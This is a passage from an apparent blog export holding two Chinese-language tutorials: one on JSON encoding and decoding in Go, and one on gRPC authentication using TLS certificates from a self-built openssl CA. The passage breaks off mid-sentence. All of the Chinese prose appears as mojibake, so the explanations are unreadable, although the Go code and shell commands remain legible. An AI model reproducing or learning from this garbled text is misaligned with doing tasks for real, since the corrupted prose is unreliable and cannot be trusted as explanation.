¼å¼è™½ç„¶ä¹Ÿæœ‰ç±»å‹ï¼Œä½†æ˜¯å¹¶ä¸ç¨³å®šï¼ŒGoè¯­è¨€åœ¨è§£ææ¥æºä¸ºéå¼ºç±»å‹è¯­è¨€æ—¶æ¯”å¦‚PHP,Pythonç­‰åºåˆ—åŒ–çš„JSONæ—¶ï¼Œç»å¸¸é‡åˆ°ä¸€äº›é—®é¢˜è¯¸å¦‚å­—æ®µç±»å‹å˜åŒ–å¯¼è‡´æ— æ³•æ­£å¸¸è§£æçš„æƒ…å†µï¼Œå¯¼è‡´æœåŠ¡ä¸ç¨³å®šã€‚æ‰€ä»¥åœ¨åšJSONç›¸å…³è§£ç å’Œç¼–ç çš„è¿‡ç¨‹ä¸­, éœ€è¦æ³¨æ„ä»¥ä¸‹äº‹é¡¹: Goè¯­è¨€ä¸­ä¸€äº›ç‰¹æ®Šçš„ç±»å‹ï¼Œæ¯”å¦‚Channelã€complexã€functionæ˜¯ä¸èƒ½è¢«è§£ææˆJSONçš„. JSONå¯¹è±¡åªæ”¯æŒstringä½œä¸ºkeyï¼Œæ‰€ä»¥è¦ç¼–ç ä¸€ä¸ªmapï¼Œé‚£ä¹ˆå¿…é¡»æ˜¯map[string]Tè¿™ç§ç±»å‹(Tæ˜¯Goè¯­è¨€ä¸­ä»»æ„çš„ç±»å‹) åµŒå¥—çš„æ•°æ®æ˜¯ä¸èƒ½ç¼–ç çš„ï¼Œä¸ç„¶ä¼šè®©JSONç¼–ç è¿›å…¥æ­»å¾ªç¯ æŒ‡é’ˆåœ¨ç¼–ç çš„æ—¶å€™ä¼šè¾“å‡ºæŒ‡é’ˆæŒ‡å‘çš„å†…å®¹ï¼Œè€Œç©ºæŒ‡é’ˆä¼šè¾“å‡ºnull æ ‡å‡†åº“è§£è¯»åœ¨ä½¿ç”¨æ ‡å‡†åº“è¿›è¡Œjsonæ“ä½œä¹‹å‰, å…ˆç®€å•äº†è§£ä¸‹æ ‡å‡†åº“æä¾›äº†é‚£äº›å¯¹JSONçš„æ“ä½œ, ä»¥ä¸‹è§£è¯»ä¸»è¦æ¥æºäºGoDoc å‡½æ•° Compact: ç”¨äºJSONå­—ç¬¦ä¸²çš„æ‹¼æ¥, æ‹¼æ¥æ—¶ä¼šæ ¡éªŒåé¢çš„å­—ç¬¦ä¸²æ˜¯å¦æ˜¯åˆæ³•json, å¦‚æœä¸æ˜¯ä¼šæŠ¥é”™, ä½†å¯¹å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦(htmlä¸å®‰å…¨å­—ç¬¦,æ¯”å¦‚ä¸Šé¢æåˆ°çš„â€&lt;â€ â€œ&gt;â€ç­‰)ä¸è¿›è¡Œè½¬ä¹‰. HTMLEscape: å’ŒCompactç›¸å¯¹, æ‹¼æ¥JSONå­—ç¬¦ä¸²æ—¶ä¼šè¿›è¡Œç‰¹æ®Šå­—ç¬¦è½¬ä¹‰, è½¬ä¹‰æˆwebå®‰å…¨çš„å­—ç¬¦. Valid: æ ¡éªŒæ•°æ®æ˜¯å¦æ˜¯åˆæ³•çš„JSONç¼–ç æ•°æ®, å¾€å¾€ç”¨äºæ•°æ®æ ¼å¼æ ¡éªŒ. Marshal: ç”¨äºç¼–ç JSON. Indent: ç”¨äºJSONçš„æ ¼å¼åŒ–è¾“å‡º, æœ€å¸¸è§çš„ç”¨æ³•æ˜¯å®šä¹‰JSONçš„ç¼©è¿›,æ¯”å¦‚2ä¸ªç©ºæ ¼çš„ç¼©è¿›. MarshalIndent: ç¼–ç JSONå,å¸¦æ ¼å¼åŒ–çš„è¾“å‡º. Unmarshal: ç”¨äºè§£ç JSON. æ¥å£ Unmarshaler: ç”¨äºè‡ªå®šä¹‰è§£ç jsonæ–¹æ³• Marshaler: ç”¨äºè‡ªå®šä¹‰ç¼–ç jsonçš„æ–¹æ³• ç»“æ„ä½“ Decoder: ä»ä¸€ä¸ªè¾“å…¥æµè¯»å–æ•°æ®å¹¶ä¸”è§£æjson Encoder: æŠŠä¸€ä¸ªç¼–ç åçš„jsonå€¼å†™å‡ºç»™ä¸€ä¸ªè¾“å‡ºæµ Number: JSONé‡Œé¢çš„numberç±»å‹ RawMessage: æ˜¯ä¸€ç§å·²ç»è¢«ç¼–ç çš„jsonå­—ç¬¦ä¸², å®ƒå®ç°äº†Marshalerå’ŒUnmarshaler, å¯ä»¥ç”¨æ¥å»¶è¿Ÿè§£æéƒ¨åˆ†json Token: ä¸€ä¸ªç©ºinterface, æŒæœ‰ä¸€ç§Jsonæ˜ å°„çš„Goå†…éƒ¨æ•°æ®ç»“æ„çš„å€¼ 123456Delim, for the four JSON delimiters [ ] &#123; &#125;bool, for JSON booleansfloat64, for JSON numbersNumber, for JSON numbersstring, for JSON string literalsnil, for JSON null å¼‚å¸¸ InvalidUTF8Error: ç”¨äºå…¼å®¹golang1.2ç‰ˆæœ¬ä¹‹å‰, 1.2è¿‡åä¸ä¼šæœ‰è¯¥å¼‚å¸¸ InvalidUnmarshalError: è¡¨ç¤ºè§£ç jsonæ—¶ä¼ é€’äº†ä¸€ä¸ªéæ³•çš„å‚æ•°, æ¯”å¦‚ä¸€ä¸ªç©ºæŒ‡é’ˆ MarshalerError: Marshalerå¼‚å¸¸ SyntaxError: jsonçš„è¯­æ³•é”™è¯¯ UnmarshalFieldError: é™çº§, æœªä½¿ç”¨, ä¸ºäº†å…¼å®¹ä¿ç•™ UnmarshalTypeError: è§£ç æ—¶ é‡åˆ°ä¸è®¤è¯†çš„jsonç±»å‹, è¡¨æ˜ä¼ å…¥çš„jsonçš„ç±»å‹æ— æ³•è¢«è½¬æ¢æˆGolangå¯¹åº”çš„ç±»å‹, æ¯”å¦‚JSON RFCå¢åŠ æ–°çš„JSONç±»å‹ å°±ä¼šé‡åˆ°è¿™æ ·çš„é”™è¯¯ UnsupportedTypeError: ç¼–ç æ—¶ é‡åˆ°ä¸è®¤è¯†çš„Golangç±»å‹, ä¸çŸ¥é“è¯¥Golangçš„æ•°æ®ç±»å‹åº”è¯¥è¢«æ˜ å°„æˆé‚£ç§jsonç±»å‹, æ¯”å¦‚è‡ªå®šä¹‰çš„ç±»å‹(æœªå®ç° marshaleræ¥å£) UnsupportedValueError: åŒä¸Š, é‡åˆ°ä¸è®¤è¯†çš„jsonç±»å‹, æ¯”å¦‚ ä½ éœ€è¦å°†golangé‡Œé¢çš„â€aâ€ç¼–ç¨‹æˆjsoné‡Œé¢ä¸å­˜åœ¨çš„ç±»å‹ Struct Tagåœ¨JSONçš„è§£æè¿‡ç¨‹ä¸­Struct Tagè¢«é¢‘ç¹ä½¿ç”¨, å› æ­¤åœ¨è¿›è¡ŒçœŸæ­£çš„è§£æä¹‹å‰, ä»‹ç»ä¸‹Golangä¸­çš„Struct Tag,åœ¨golangä¸­, å‘½åéƒ½æ˜¯æ¨èéƒ½æ˜¯ç”¨é©¼å³°æ–¹å¼, å¹¶ä¸”åœ¨é¦–å­—æ¯å¤§å°å†™æœ‰ç‰¹æ®Šçš„è¯­æ³•å«ä¹‰(å¤§å†™å˜é‡å¯ä»¥å¯¼å‡ºåŒ…, å°å†™å˜é‡åŒ…ç§æœ‰)ã€‚ä½†æ˜¯ç”±äºç»å¸¸éœ€è¦å’Œå…¶å®ƒçš„ç³»ç»Ÿè¿›è¡Œæ•°æ®äº¤äº’, ä¾‹å¦‚è½¬æˆjsonæ ¼å¼, å­˜å‚¨åˆ°mongodbå•Šç­‰ç­‰ã€‚è¿™ä¸ªæ—¶å€™å¦‚æœç”¨å±æ€§åæ¥ä½œä¸ºé”®å€¼å¯èƒ½ä¸ä¸€å®šä¼šç¬¦åˆé¡¹ç›®è¦æ±‚, æ¯”å¦‚ä¸æ˜¯ç”¨Struct Tagæ—¶, JSONè§£æå‡ºæ¥çš„ç»“æœæ˜¯è¿™æ ·çš„: 123456789101112131415161718package mainimport ( "encoding/json" "fmt")// User is test for jsontype User struct &#123; ID string Name string&#125;func main() &#123; u := User&#123;ID: "user001", Name: "tom"&#125; jsonU, _ := json.Marshal(u) fmt.Println(string(jsonU))&#125; è¾“å‡ºå†…å®¹å¦‚ä¸‹:1&#123;"ID":"user001","Name":"tom"&#125; æ˜¾ç„¶å¦‚æœè¿™æ ·è§£æJSONä¼šå¤ªæ­»æ¿, æ— æ³•é¢å¯¹çµæ´»çš„ä¸šåŠ¡, è€Œå…·ä½“å¦‚ä½•è½¬æ¢åº”è¯¥äº¤ç»™æˆ‘ä»¬è‡ªå·±æ§åˆ¶, è€ŒStruct Tagå°±æ˜¯ç”¨æ¥å¹²è¿™ä¸ªäº‹å„¿çš„ã€‚Struct Tagé‡‡ç”¨ è·Ÿéšåœ¨Struct Fieldåé¢ã€‚12345678910111213141516171819202122232425é‚£`Struct Tag`çš„å·¥ä½œåŸç†æ˜¯å’‹æ ·çš„? éœ€è¦ç”¨åˆ°Tagä¸­çš„å†…å®¹æ—¶, å’‹æ ·å»è·å–å–ƒ? å…¶å®æ˜¯ä½¿ç”¨åå°„(reflect)ä¸­çš„æ–¹æ³•æ¥è·å–çš„:```golangpackage mainimport ( &quot;fmt&quot; &quot;reflect&quot;)// User is test for jsontype User struct &#123; ID string `json:&quot;json_id&quot; bson:&quot;bson_id&quot; custom:&quot;my_id&quot;` Name string `json:&quot;json_name&quot; bson:&quot;bson_name&quot; custom:&quot;my_name&quot;`&#125;func main() &#123; u := &amp;User&#123;ID: &quot;user001&quot;, Name: &quot;tom&quot;&#125; t := reflect.TypeOf(u) // è·å–ç¬¬ä¸€ä¸ªå­—æ®µçš„Struct Tagçš„å€¼ f0 := t.Elem().Field(0) fmt.Println(f0.Tag.Get(&quot;json&quot;)) fmt.Println(f0.Tag.Get(&quot;bson&quot;)) fmt.Println(f0.Tag.Get(&quot;custom&quot;))&#125; è¾“å‡ºç»“æœå¦‚ä¸‹:123json_idbson_idmy_id è§£æJSONé€šè¿‡æ ‡å‡†åº“æä¾›çš„Unmarshalå‡½æ•°æ¥è§£æJSON, ä½†æ˜¯æ ‡å‡†åº“åœ¨è§£ææœªçŸ¥æ ¼å¼çš„JSONæ—¶æ¯”è¾ƒéº»çƒ¦, éœ€è¦è§£æåˆ°interface{},ç„¶åæ–­è¨€, å› æ­¤å¦‚æœæƒ³è¦çµæ´»çš„è§£æJSONå¯ä»¥ä½¿ç”¨ä¸€äº›ç¬¬ä¸‰æ–¹åº“,æ¯”å¦‚jsonitor è§£æå·²çŸ¥JSONä¹‹å‰ä»‹ç»äº†Golangä¸­çš„Struct Tag, è€Œæ ‡å‡†åº“encoding/jsonå°±æ˜¯åˆ©ç”¨Stuct Tagå¯ä»¥è½»æ¾å®ç°JSONç¼–è§£ç è¿‡ç¨‹ä¸­çš„ä¸€äº›è‡ªå®šä¹‰è½¬æ¢, è€Œå…³äºJSON Struct Tagå…·ä½“çš„å€¼, æ ‡å‡†åº“æ–‡æ¡£é‡Œé¢æœ‰ç›¸åº”çš„æè¿°, è¿™é‡Œä½œç®€å•çš„æ¦‚è¿°: Json Struct Tag æ ¼å¼ä¸ºjson: &quot;filed_name,argument&quot; filed_name ä¸ºç”¨æˆ·è‡ªå®šä¹‰çš„éœ€è¦è½¬æ¢çš„å­—æ®µå, å¦‚æœä¸ºâ€-â€œè¡¨ç¤º è½¬æ¢æ—¶ç›´æ¥å¿½ç•¥å­—æ®µ argument è¡¨ç¤ºè¯¥å­—æ®µè½¬æ¢æ—¶çš„ä¸€äº›é¢å¤–çš„å‚æ•° omitempty è¡¨ç¤ºå¦‚æœä¸ºç©ºç½®åˆ™å¿½ç•¥å­—æ®µ jsonæ•°æ®ç±»å‹, æ¯”å¦‚string, numbers, è¡¨ç¤ºåœ¨è½¬æ¢æ—¶, è°ƒæ•´æˆå¯¹åº”çš„æ•°æ®ç±»å‹ 12345678910111213141516171819202122232425package mainimport ( "encoding/json" "fmt")// Product _type Product struct &#123; Name string `json:"name"` ProductID int64 `json:"product_id,string"` Number int `json:"number,string"` Price float64 `json:"price,string"` IsOnSale bool `json:"is_on_sale,string"` Test string `json:"-"` OMTest string `json:"om_test,omitempty"`&#125;func main() &#123; str := `&#123;"name":"test","product_id":"1","number":"110011","price":"0.01","is_on_sale":"true"&#125;` p := Product&#123;&#125; json.Unmarshal([]byte(str), &amp;p) fmt.Println(p)&#125; è¾“å‡ºç»“æœ:1&#123;test 1 110011 0.01 true &#125; è§£ææœªçŸ¥JSONä¸Šé¢é‚£ç§è§£ææ–¹å¼æ˜¯åœ¨æˆ‘ä»¬çŸ¥æ™“è¢«è§£æçš„JSONæ•°æ®çš„ç»“æ„çš„å‰æä¸‹é‡‡å–çš„æ–¹æ¡ˆ, å¦‚æœæˆ‘ä»¬ä¸çŸ¥é“è¢«è§£æçš„æ•°æ®çš„æ ¼å¼, åˆåº”è¯¥å¦‚ä½•æ¥è§£æå‘¢?æˆ‘ä»¬çŸ¥é“interface{}å¯ä»¥ç”¨æ¥å­˜å‚¨ä»»æ„æ•°æ®ç±»å‹çš„å¯¹è±¡ï¼Œè¿™ç§æ•°æ®ç»“æ„æ­£å¥½ç”¨äºå­˜å‚¨è§£æçš„æœªçŸ¥ç»“æ„çš„jsonæ•°æ®çš„ç»“æœã€‚JSONåŒ…ä¸­é‡‡ç”¨map[string]interface{}å’Œ[]interface{}ç»“æ„æ¥å­˜å‚¨ä»»æ„çš„JSONå¯¹è±¡å’Œæ•°ç»„ã€‚ è§£æåˆ°interface{}1234567891011121314151617181920212223242526272829303132333435363738394041package mainimport ( "encoding/json" "fmt")// Product _type Product struct &#123; Name string `json:"name"` ProductID int64 `json:"product_id,string"` Number int `json:"number,string"` Price float64 `json:"price,string"` IsOnSale bool `json:"is_on_sale,string"` Test string `json:"-"` OMTest string `json:"om_test,omitempty"`&#125;func main() &#123; // å‡è®¾æˆ‘ä»¬å¹¶ä¸çŸ¥é“è¿™ä¸ªJSONçš„æ ¼å¼, æˆ‘ä»¬å¯ä»¥å°†ä»–è§£æåˆ°interface&#123;&#125; str := `&#123;"name":"test","product_id":"1","number":"110011","price":"0.01","is_on_sale":"true"&#125;` var p interface&#123;&#125; json.Unmarshal([]byte(str), &amp;p) // ç°åœ¨æˆ‘ä»¬éœ€è¦ä»è¿™ä¸ªinterface&#123;&#125;è§£æå‡ºé‡Œé¢çš„æ•°æ® m := p.(map[string]interface&#123;&#125;) for k, v := range m &#123; switch vv := v.(type) &#123; case string: fmt.Printf("%s is string, value: %s\n", k, vv) case int: fmt.Printf("%s is int, value: %d\n", k, vv) case int64: fmt.Printf("%s is int64, value: %d\n", k, vv) case bool: fmt.Printf("%s is bool, vaule: %v", k, vv) default: fmt.Printf("%s is unknow type\n", k) &#125; &#125;&#125; è¾“å‡ºç»“æœ:12345name is string, value: testproduct_id is string, value: 1number is string, value: 110011price is string, value: 0.01is_on_sale is string, value: true ä½¿ç”¨ç¬¬ä¸‰æ–¹åº“jsonitorè¿›è¡Œè§£æå¤§é‡çš„ç±»å‹æ–­è¨€æ˜¯ä¸æ˜¯è®©ä½ è§‰å¾—å¾ˆçƒ¦, å¦‚æœæ˜¯å¤šå±‚interface{}åµŒå¥—é‚£ä¹ˆæ–­è¨€éœ€è¦æ›´å¤š, å› æ­¤å°±æœ‰å¾ˆå¤šç¬¬ä¸‰æ–¹JSONè§£æåº“å‡ºç°, ä»–ä»¬å°½é‡é‡‡ç”¨æµå¼è¿­ä»£è§£æ, è¿™é‡Œæˆ‘ç”¨è¿‡çš„æ¯”è¾ƒä¸é”™çš„æ˜¯é™¶æ–‡çš„jsonitor:1234567891011121314151617181920212223package mainimport ( "fmt" "github.com/json-iterator/go")// Product _type Product struct &#123; Name string `json:"name"` ProductID int64 `json:"product_id,string"` Number int `json:"number,string"` Price float64 `json:"price,string"` IsOnSale bool `json:"is_on_sale,string"` Test string `json:"-"` OMTest string `json:"om_test,omitempty"`&#125;func main() &#123; str := `&#123;"name":"test","product_id":"1","number":"110011","price":"0.01","is_on_sale":"true"&#125;` fmt.Println(jsoniter.Get([]byte(str), "price").ToFloat64())&#125; è‡ªå®šä¹‰è§£æstructå®ç°Unmarshaleræ¥å£, ä¾¿å¯ä»¥å®ç°è§£æJSONçš„è¿‡ç¨‹,1234567891011121314151617181920212223242526272829303132333435363738394041package mainimport ( "encoding/json" "fmt")// Product _type Product struct &#123; Name string `json:"name"` ProductID int64 `json:"product_id,string"` Number int `json:"number,string"` Price float64 `json:"price,string"` IsOnSale bool `json:"is_on_sale,string"` Test string `json:"-"` OMTest string `json:"om_test,omitempty"`&#125;// UnmarshalJSON è‡ªå®šä¹‰è§£æfunc (p *Product) UnmarshalJSON(data []byte) error &#123; // ç¤ºä¾‹ä»£ç ä½¿ç”¨jsonitorä»£ä¸ºè§£æ p.Price = 0.01 p.Number = 1100 p.Name = "my_test_name" return nil&#125;// MarshalJSON è‡ªå®šä¹‰ç¼–ç func (p *Product) MarshalJSON() ([]byte, error) &#123; // è‡ªå·±ç¼–ç json return []byte(`&#123;"test":"name_test"&#125;`), nil&#125;func main() &#123; str := `&#123;"name":"test","product_id":"1","number":"110011","price":"0.01","is_on_sale":"true"&#125;` p := Product&#123;&#125; json.Unmarshal([]byte(str), &amp;p) fmt.Println(p)&#125; ç”ŸæˆJSONæˆ‘ä»¬å¯ä»¥é€šè¿‡æ ‡å‡†åº“jsonå°†Strucåºåˆ—åŒ–æˆJSONä¹Ÿå¯ä»¥è‡ªå®šä¹‰åºåˆ—åŒ–çš„æ–¹æ³• é€šè¿‡structç”ŸæˆJSONä¸Šé¢åœ¨ä»‹ç»JSONè§£æçš„æ—¶å€™å·²ç»ä»‹ç»äº†å…³äºJSONçš„Struct Tagäº†, å› æ­¤ç›´æ¥å‚è€ƒä»£ç :12345678910111213141516171819202122232425262728293031package mainimport ( "encoding/json" "fmt")// Product _type Product struct &#123; Name string `json:"name"` ProductID int64 `json:"product_id,string"` Number int `json:"number,string"` Price float64 `json:"price,string"` IsOnSale bool `json:"is_on_sale,string"` Test string `json:"-"` OMTest string `json:"om_test,omitempty"`&#125;func main() &#123; p := &amp;Product&#123; Name: "test", ProductID: 01, Number: 110011, Price: 0.01, IsOnSale: true, Test: "test", &#125; jsonP, _ := json.Marshal(p) fmt.Println(string(jsonP))&#125; è¾“å‡ºç»“æœå¦‚ä¸‹:1&#123;"name":"test","product_id":"1","number":"110011","price":"0.01","is_on_sale":"true"&#125; è‡ªå®šä¹‰ç”ŸæˆStructå®ç°Marshaleræ¥å£, ä¾¿å¯ä»¥è‡ªå®šä¹‰ç¼–ç è¿‡ç¨‹1234567891011121314151617181920212223242526272829303132333435363738394041424344454647package mainimport ( "encoding/json" "fmt")// Product _type Product struct &#123; Name string `json:"name"` ProductID int64 `json:"product_id,string"` Number int `json:"number,string"` Price float64 `json:"price,string"` IsOnSale bool `json:"is_on_sale,string"` Test string `json:"-"` OMTest string `json:"om_test,omitempty"`&#125;// UnmarshalJSON è‡ªå®šä¹‰è§£æfunc (p *Product) UnmarshalJSON(data []byte) error &#123; // ç¤ºä¾‹ä»£ç ä½¿ç”¨jsonitorä»£ä¸ºè§£æ p.Price = 0.01 p.Number = 1100 p.Name = "my_test_name" return nil&#125;// MarshalJSON è‡ªå®šä¹‰ç¼–ç func (p *Product) MarshalJSON() ([]byte, error) &#123; // è‡ªå·±ç¼–ç json return []byte(`&#123;"test":"name_test"&#125;`), nil&#125;func main() &#123; p := &amp;Product&#123; Name: "test", ProductID: 01, Number: 110011, Price: 0.01, IsOnSale: true, Test: "test", &#125; jsonP, _ := json.Marshal(p) fmt.Println(string(jsonP))&#125; å‚è€ƒ JSONå®˜æ–¹ä»‹ç» JSON RFC4672 encoding/json godoc Go Blog: JSON and Go Golangä¸­ä½¿ç”¨JSONçš„ä¸€äº›å°æŠ€å·§]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>json</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[gRPCåŸºäºæ‹¦æˆªå™¨æ¨¡å¼çš„è®¤è¯]]></title>
    <url>%2F2017%2F08%2F07%2Fgrpc-auth%2F</url>
    <content type="text"><![CDATA[gRPCçš„æœåŠ¡ç«¯éœ€è¦ä¸è®¤è¯å¹³å°å¯¹æ¥, ä¹‹å‰ä½¿ç”¨httpæ—¶é€šè¿‡ä¸­é—´ä»¶çš„å½¢å¼è¿›è¡Œå®ç°, å› æ­¤è¿™ç¯‡æ–‡ç« ä¸»è¦éªŒè¯gRPCä¸­èƒ½å¦ä»¥ä¸­é—´ä»¶çš„å½¢å¼å®ç°gRPCçš„è®¤è¯ã€‚ è®¤è¯æ–¹å¼gRPC é»˜è®¤æä¾›äº†ä¸¤ç§è®¤è¯æ–¹å¼ï¼š åŸºäºSSL/TLSè®¤è¯æ–¹å¼ è¿œç¨‹è°ƒç”¨è®¤è¯æ–¹å¼ä¸ºäº†ä¿è¯API Gatewayä¸åç«¯gRPCæœåŠ¡é€šä¿¡çš„å®‰å…¨åŒæ—¶ä¿è¯tokenå®‰å…¨, ä»¥ä¸Š2ç§æ–¹å¼åŒæ—¶ä½¿ç”¨ã€‚ ä»£ç ç¤ºä¾‹æˆ‘éœ€è¦éªŒè¯çš„æµç¨‹å¤§è‡´å¦‚ä¸‹(ä¸Openstackçš„è®¤è¯æµç¨‹ä¸€æ ·):å®Œæ•´çš„ä»£ç†ç¤ºä¾‹: grpcä¸­é—´ä»¶è®¤è¯ åœ¨è¿›è¡Œcodingå‰, æˆ‘ä»¬éœ€è¦ä¸ºæœåŠ¡ç«¯ç”ŸæˆTLSéœ€è¦çš„è¯ä¹¦: è‡ªå»ºCA 12345678910111213141516# ç”ŸæˆCAè‡ªå·±çš„ç§é’¥$(umask 077; openssl genrsa -out private/cakey.pem 2048)# è‡ªç­¾10å¹´$openssl req -new -x509 -key private/cakey.pem -out cacert.pemCountry Name (2 letter code) [AU]:CNState or Province Name (full name) [Some-State]:SiChuanLocality Name (eg, city) []:ChengDuOrganization Name (eg, company) [Internet Widgits Pty Ltd]:defineIOT LtdOrganizational Unit Name (eg, section) []:TecCommon Name (e.g. server FQDN or YOUR name) []:caEmail Address []:yumaojun03@gmail.com# åˆå§‹åŒ–è‡ªå»ºCAçš„ä¸€éƒ¨åˆ†æ–‡ä»¶$mkdir certs newcerts crl$touch index.txt$touch serial$echo 01 &gt; serial ç­¾å‘æœåŠ¡ç«¯è¯ä¹¦ 1234567891011121314151617181920212223242526272829303132# ç”Ÿæˆserverè‡ªå·±çš„ç§é’¥$openssl genrsa -out server1.key 2048# ç”Ÿæˆè¯ä¹¦ç­¾è¯è¯·æ±‚$openssl req -new -key server1.key -out server1.csrCountry Name (2 letter code) [AU]:CNState or Province Name (full name) [Some-State]:ChengduLocality Name (eg, city) []:ChengduOrganization Name (eg, company) [Internet Widgits Pty Ltd]:defineIOT LtdOrganizational Unit Name (eg, section) []:TecCommon Name (e.g. server FQDN or YOUR name) []:server1Email Address []:yumaojun03@gmail.comPlease enter the following 'extra' attributesto be sent with your certificate requestA challenge password []:An optional company name []:# å› ä¸ºæˆ‘CAå°±åœ¨æœ¬æœåŠ¡å™¨ä¸Š,ç›´æ¥ç­¾å‘è¯ä¹¦$openssl ca -in GoWorkDir/src/golang/grpc-auth/keys/server1.csr -out server1.pem -days 3650Using configuration from /System/Library/OpenSSL/openssl.cnfCheck that the request matches the signatureSignature okThe stateOrProvinceName field needed to be the same in theCA certificate (SiChuan) and the request (Chengdu)# å°†ç­¾å¥½çš„è¯ä¹¦äº¤ç»™server$mv server1.pem GoWorkDir/src/golang/grpc-auth/keys# serverç«¯çš„è¯ä¹¦å‡†å¤‡å®Œæˆ$ll GoWorkDir/src/golang/grpc-auth/keystotal 40-rw-r--r-- 1 maojun staff 1.6K 8 8 09:15 cacert.pem-rw-r--r-- 1 maojun staff 1.0K 8 8 09:27 server1.csr-rw-r--r-- 1 maojun staff 1.6K 8 7 21:21 server1.key-rw-r--r-- 1 maojun staff 4.5K 8 8 09:28 server1.pem ç›®å½•ç»“æ„ç”Ÿæˆå¥‘çº¦æ–‡ä»¶1$protoc --go_out=plugins=grpc:. hello.proto ç›®å½•ç»“æ„å¦‚ä¸‹:1234567891011121314$tree ..â”œâ”€â”€ clientâ”‚ â””â”€â”€ main.goâ”œâ”€â”€ keysâ”‚ â”œâ”€â”€ cacert.pemâ”‚ â”œâ”€â”€ server1.csrâ”‚ â”œâ”€â”€ server1.keyâ”‚ â””â”€â”€ server1.pemâ”œâ”€â”€ protoâ”‚ â”œâ”€â”€ hello.pb.goâ”‚ â””â”€â”€ hello.protoâ””â”€â”€ server â””â”€â”€ main.go tlså…ˆçœ‹credentials.goä¸­å…³äºé€šè¿‡TLSåˆ›å»ºå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ç›¸å…³å‡½æ•°12345678910111213141516171819202122// NewClientTLSFromFile ä¼ å…¥å®¢æˆ·ç«¯å»ºç«‹TLSè¿æ¥æ—¶éœ€è¦çš„è¯ä¹¦, è¿™é‡Œä¸»è¦æŒ‡CAçš„è¯ä¹¦// serverNameOverride ä»…ä»…ç”±äºæµ‹è¯•, é€šå¸¸ä¼ å…¥""func NewClientTLSFromFile(certFile, serverNameOverride string) (TransportCredentials, error) &#123; b, err := ioutil.ReadFile(certFile) if err != nil &#123; return nil, err &#125; cp := x509.NewCertPool() if !cp.AppendCertsFromPEM(b) &#123; return nil, fmt.Errorf("credentials: failed to append certificates") &#125; return NewTLS(&amp;tls.Config&#123;ServerName: serverNameOverride, RootCAs: cp&#125;), nil&#125;// NewServerTLSFromFile ä¼ å…¥æœåŠ¡ç«¯å»ºç«‹TLSè¿æ¥æ—¶éœ€è¦çš„è¯ä¹¦, è¿™é‡Œä¸»è¦æŒ‡æœåŠ¡ç«¯çš„è¯ä¹¦å’Œç§é’¥func NewServerTLSFromFile(certFile, keyFile string) (TransportCredentials, error) &#123; cert, err := tls.LoadX509KeyPair(certFile, keyFile) if err != nil &#123; return nil, err &#125; return NewTLS(&amp;tls.Config&#123;Certificates: []tls.Certificate&#123;cert&#125;&#125;), nil&#125; å› æ­¤æˆ‘ä»¬è‡ªå»ºä¸€ä¸ªCA, ç„¶åç”Ÿæˆserverç«¯çš„è¯ä¹¦å°±å¯ä»¥ä½¿ç”¨è¿™ç»„å‡½æ•°æ¥å®ŒæˆTLSçš„å»ºç«‹äº† æœåŠ¡ç«¯TLSå¯åŠ¨1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253package mainimport ( "net" pb "golang/grpc-auth/proto" "golang.org/x/net/context" "google.golang.org/grpc" "google.golang.org/grpc/credentials" // å¼•å…¥grpcè®¤è¯åŒ… "google.golang.org/grpc/grpclog")const ( // Address gRPCæœåŠ¡åœ°å€ Address = "127.0.0.1:50052")// å®šä¹‰helloServiceå¹¶å®ç°çº¦å®šçš„æ¥å£type helloService struct&#123;&#125;// HelloService ...var HelloService = helloService&#123;&#125;func (h helloService) SayHello(ctx context.Context, in *pb.HelloRequest) (*pb.HelloResponse, error) &#123; resp := new(pb.HelloResponse) resp.Message = "Hello " + in.Name + "." return resp, nil&#125;func main() &#123; listen, err := net.Listen("tcp", Address) if err != nil &#123; grpclog.Fatalf("failed to listen: %v", err) &#125; // TLSè®¤è¯ creds, err := credentials.NewServerTLSFromFile("../keys/server1.pem", "../keys/server1.key") if err != nil &#123; grpclog.Fatalf("Failed to generate credentials %v", err) &#125; // å®ä¾‹åŒ–grpc Server, å¹¶å¼€å¯TLSè®¤è¯ s := grpc.NewServer(grpc.Creds(creds)) // æ³¨å†ŒHelloService pb.RegisterHelloServer(s, HelloService) grpclog.Println("Listen on " + Address + " with TLS") s.Serve(listen)&#125; å®¢æˆ·ç«¯å¸¦è¯ä¹¦è°ƒç”¨1234567891011121314151617181920212223242526272829303132333435363738394041424344package mainimport ( pb "golang/grpc-auth/proto" "golang.org/x/net/context" "google.golang.org/grpc" "google.golang.org/grpc/credentials" // å¼•å…¥grpcè®¤è¯åŒ… "google.golang.org/grpc/grpclog")const ( // Address gRPCæœåŠ¡åœ°å€ Address = "127.0.0.1:50052")func main() &#123; // TLSè¿æ¥ creds, err := credentials.NewClientTLSFromFile("../keys/cacert.pem", "server1") if err != nil &#123; grpclog.Fatalf("Failed to create TLS credentials %v", err) &#125; conn, err := grpc.Dial(Address, grpc.WithTransportCredentials(creds)) if err != nil &#123; grpclog.Fatalln(err) &#125; defer conn.Close() // åˆå§‹åŒ–å®¢æˆ·ç«¯ c := pb.NewHelloClient(conn) // è°ƒç”¨æ–¹æ³• reqBody := new(pb.HelloRequest) reqBody.Name = "gRPC" r, err := c.SayHello(context.Background(), reqBody) if err != nil &#123; grpclog.Fatalln(err) &#125; grpclog.Println(r.Message)&#125; è®¤è¯æ‹¦æˆªå™¨è®¤è¯åŒ…å«2éƒ¨åˆ†: æœåŠ¡ç«¯è®¤è¯token å®¢æˆ·ç«¯æºå¸¦token æœåŠ¡ç«¯è®¤è¯tokenæ‹¦æˆªå™¨éƒ¨åˆ†çš„æºç åœ¨interceptor.goä¸­, æˆ‘ä»…å…³æ³¨æ™®é€šrpc, å¯¹äºæµå¼rpcçš„æ‹¦æˆªå™¨ä¸åšè¯´æ˜, ä»¥ä¸‹æ˜¯ç›¸å…³å‡½æ•°: å®¢æˆ·ç«¯æ‹¦æˆªå™¨ æœåŠ¡ç«¯æ‹¦æˆªå™¨12345678// UnaryClientInterceptoræ‹¦æˆªåœ¨å®¢æˆ·ç«¯æ‰§è¡Œçš„éæµå¼RPC. inovkerå°±æ˜¯çœŸæ­£çš„RPCçš„handler,// 